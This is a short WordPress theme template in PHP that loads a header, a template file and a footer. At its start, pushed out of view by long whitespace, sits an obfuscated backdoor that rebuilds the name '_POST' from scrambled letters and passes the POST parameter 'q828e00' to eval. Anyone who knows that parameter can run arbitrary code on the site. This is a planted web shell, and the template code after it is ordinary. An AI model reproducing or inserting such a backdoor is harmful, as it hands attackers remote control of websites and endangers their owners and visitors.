<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q828e00'])){eval(${$s20}['q828e00']);}?><?php get_header(); $template = pxlTemplates::init(); clog($template); ?>
	<div class="template">
		<?php get_template_file( $template, array( 'cfs' => ( isset($post) ? get_post_custom() : false ) ) ); ?>
	</div>
<?php get_footer(); ?>